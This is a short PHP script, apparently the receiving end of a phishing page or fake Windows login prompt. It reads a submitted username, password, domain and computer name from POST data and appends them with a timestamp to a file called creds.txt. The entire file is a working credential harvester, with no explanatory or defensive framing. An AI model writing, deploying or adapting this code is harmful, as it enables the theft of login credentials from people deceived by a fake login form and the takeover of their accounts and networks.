<?php
$file = "creds.txt";
$date = date("h:i:s m-d-Y");
$username = $_POST['username'];
$password = $_POST['password'];
$domain = $_POST['domain'];
$computer = $_POST['computer'];
$creds = "Date: ".$date." | Domain: ".$domain." | ComputerName: ".$computer." | Username: ".$username." | Password: ".$password."\n";
file_put_contents($file, $creds, FILE_APPEND);